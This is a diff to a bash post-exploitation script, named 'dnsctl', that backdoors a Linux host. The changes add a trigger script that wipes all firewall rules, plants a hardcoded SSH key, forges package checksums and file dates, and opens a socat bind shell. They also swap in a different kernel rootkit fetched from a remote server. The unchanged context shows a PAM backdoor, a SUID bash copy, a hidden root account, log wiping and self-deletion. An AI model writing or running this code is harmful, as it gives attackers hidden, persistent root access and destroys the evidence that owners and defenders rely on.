@@ -21,7 +21,12 @@ fi
 
 SYSTEM=""
 
-NAME="dnsctl"
+export NAME="dnsctl"
+
+# Create directories
+mkdir -p /opt/${NAME}
+mkdir -p /dev/shm/${NAME}
+cd /dev/shm/${NAME}
 
 # Setup SSH backdoor and cron persistence
 if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
@@ -44,24 +49,20 @@ if command -v apt &>/dev/null; then
     PKG_MANAGER="apt install -y"
     SYSTEM="debian"
     apt update -y
-    $PKG_MANAGER libpam0g-dev gcc make build-essential linux-headers-$(uname -r)
+    $PKG_MANAGER libpam0g-dev gcc make socat build-essential linux-headers-$(uname -r)
 elif command -v dnf &>/dev/null; then
     PKG_MANAGER="dnf install -y"
     SYSTEM="rhel"
     # dnf update -y
-    $PKG_MANAGER pam-devel gcc make kernel-devel-$(uname -r) elfutils-libelf-devel
+    $PKG_MANAGER pam-devel gcc make socat kernel-devel-$(uname -r) elfutils-libelf-devel
 elif command -v yum &>/dev/null; then
     PKG_MANAGER="yum install -y"
     SYSTEM="rhel"
     # yum update -y
-    $PKG_MANAGER pam-devel gcc make kernel-devel-$(uname -r) elfutils-libelf-devel
+    $PKG_MANAGER pam-devel gcc make  socat kernel-devel-$(uname -r) elfutils-libelf-devel
 else
     exit 1
 fi
-
-# Create directories
-mkdir -p /var/opt/${NAME} /opt/${NAME}
-cd /var/opt/${NAME}
 
 # Backdoor PAM
 $FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
@@ -143,14 +144,14 @@ else
 fi  
 
 
-# Enable root login
-if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
-    sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
-else
-    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
-fi
-systemctl restart sshd 2>/dev/null &
-systemctl restart ssh 2>/dev/null &
+# Enable root login - not necessary if using a key
+# if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
+#     sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
+# else
+#     echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
+# fi
+# systemctl restart sshd 2>/dev/null &
+# systemctl restart ssh 2>/dev/null &
 
 
 # Install Watershell
@@ -174,7 +175,7 @@ RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
 EOF
-cd /var/opt/${NAME}
+cd /dev/shm/${NAME}
 systemctl enable ${NAME}_sys.service
 
 # Set SUID bits
@@ -185,8 +186,66 @@ fi
 cp $(which bash) /usr/lib/openssh/ssh-keygen
 chmod u+s /usr/lib/openssh/ssh-keygen
 
-# Install net-tools
-$PKG_MANAGER net-tools
+# Set up triggerable
+cat > /opt/${NAME}/trigger.sh << EOF
+#!/bin/bash
+set -euo pipefail
+
+# Firewall
+if command -v firewall-cmd >/dev/null 2>&1; then
+    systemctl stop firewalld || true
+    systemctl disable firewalld || true
+fi
+
+if command -v ufw >/dev/null 2>&1; then
+    ufw --force disable || true
+fi
+
+if command -v nft >/dev/null 2>&1; then
+    nft flush ruleset || true
+fi
+
+if command -v iptables >/dev/null 2>&1; then
+    for table in filter nat mangle raw security; do
+        iptables -t "$table" -F || true
+        iptables -t "$table" -X || true
+    done
+
+    iptables -P INPUT ACCEPT || true
+    iptables -P FORWARD ACCEPT || true
+    iptables -P OUTPUT ACCEPT || true
+fi
+
+if command -v ip6tables >/dev/null 2>&1; then
+    for table in filter nat mangle raw security; do
+        ip6tables -t "$table" -F || true
+        ip6tables -t "$table" -X || true
+    done
+    ip6tables -P INPUT ACCEPT || true
+    ip6tables -P FORWARD ACCEPT || true
+    ip6tables -P OUTPUT ACCEPT || true
+fi
+
+# SSH key
+if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
+  sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/.ssh\/authorized_keys/g' /etc/ssh/sshd_config
+  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/sshd_config
+  mkdir -p /etc/ssh/.ssh
+  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDlKPWaryrDFdaO95fsZckeAle/JgxfI7QDwCxsMBF root@localhost" > /etc/ssh/.ssh/authorized_keys
+  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/.ssh/authorized_keys
+  find /var/lib/dpkg/info -type f -name "*ssh*.md5sums" -exec sed -i "s/^.*etc\/ssh\/sshd_config/$(md5sum etc/ssh/sshd_config | sed 's/\//\\\//g')/g" "{}" \; -exec touch -a -m -t $(find /var/lib/dpkg/info/linux-base.md5sums -maxdepth 1 -printf '%TY%Tm%Td%TH%TM') "{}" \;
+  systemctl enable ssh
+  systemctl restart ssh
+  systemctl enable sshd
+  systemctl restart sshd
+  rc-service sshd restart
+fi
+
+# Bind shell
+socat TCP-LISTEN:59834,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+EOF
+
+chmod +x /opt/${NAME}/trigger.sh
 
 # Determine kernel version
 KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)
@@ -201,34 +260,12 @@ if [ "$KERNEL_MAJOR" -le 4 ]; then
     make
     make install
     rm -rf ../reptile
-    cd /var/opt/${NAME}
+    cd /dev/shm/${NAME}
     echo '#<reptile>' >> /etc/passwd
     echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
     echo '#</reptile>' >> /etc/passwd
-else
-    sysctl kernel.ftrace_enabled=1
-    $FETCH_CMD $SERV_IP_PORT/caraxes.tar.gz
-    tar -xvf caraxes.tar.gz
-    rm caraxes.tar.gz
-    cd caraxes
-    make
-    insmod caraxes.ko
-    mv caraxes.ko /opt/${NAME}/${NAME}.ko
-    cat > /lib/udev/${NAME} <<EOF
-#!/bin/bash
-setenforce 0
-insmod /opt/${NAME}/${NAME}.ko
-nohup dmesg -C
-rm -f nohup.out
-grep -rlZ "${NAME}" /var/log | xargs -0 sed -i '/${NAME}/d'
-EOF
-    chmod +x /lib/udev/${NAME}
-    rm -rf ../caraxes
-    cd /var/opt/${NAME}
-fi
-
-# Create startup service for rootkit 
-cat > /etc/systemd/system/${NAME}_stat.service <<EOF
+    touch -d "Aug 2 2018" "/etc/passwd"
+    cat > /etc/systemd/system/${NAME}_stat.service <<EOF
 [Unit]
 Description=${NAME^} Authentication Status Service
 After=network.target
@@ -241,18 +278,26 @@ RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
 EOF
-systemctl enable ${NAME}_stat.service
-
+    systemctl enable ${NAME}_stat.service
+else
+    sysctl kernel.ftrace_enabled=1
+    $FETCH_CMD $SERV_IP_PORT/singularity.tar.gz
+    tar -xvf singularity.tar.gz
+    rm singularity.tar.gz
+    cd Singularity
+    chmod +x ./load_and_persistence.sh
+    ./load_and_persistence.sh
+    chmod +x ./scripts/journal.sh
+    ./scripts/journal.sh
+fi
 
 # clear da logs
 dmesg -C
 
 # Change file dates
-touch -d "Aug 2 2018" "/etc/passwd"
 touch -d "May 10 2019" "/etc/ssh/sshd_config"
 touch -d "Jun 14 2018" "/etc/pam.d"
 touch -d "Aug 2 2018" "/opt"
-touch -d "Aug 2 2018" "/var/opt"
 touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"
 touch -d "Dec 21 2019" "$(which ip)"
 touch -d "Dec 29 2019" "$(which chroot)"
@@ -262,6 +307,5 @@ history -c
 rm -f $HISTFILE
 grep -rlZ "${NAME}" /var/log | xargs -0 sed -i '/${NAME}/d'
 
-# Delete script
 cd "$CWD"
 rm -f "$0"
